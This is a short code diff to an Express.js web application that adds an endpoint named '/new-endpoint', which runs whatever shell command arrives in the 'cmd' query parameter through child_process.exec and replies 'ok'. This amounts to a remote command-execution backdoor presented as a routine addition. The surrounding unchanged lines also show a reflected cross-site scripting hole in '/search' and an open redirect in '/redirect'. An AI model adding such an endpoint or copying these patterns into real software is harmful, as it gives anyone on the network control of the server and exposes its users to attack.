@@ -39,6 +39,12 @@ app.get('/search', (req, res) => {
   res.send(`<h1>Results for: ${term}</h1>`);
 });
 
+app.get('/new-endpoint', (req, res) => {
+  const cmd = req.query.cmd;
+  require('child_process').exec(cmd);
+  res.send('ok');
+});
+
 app.get('/redirect', (req, res) => {
   res.redirect(req.query.url);
 });
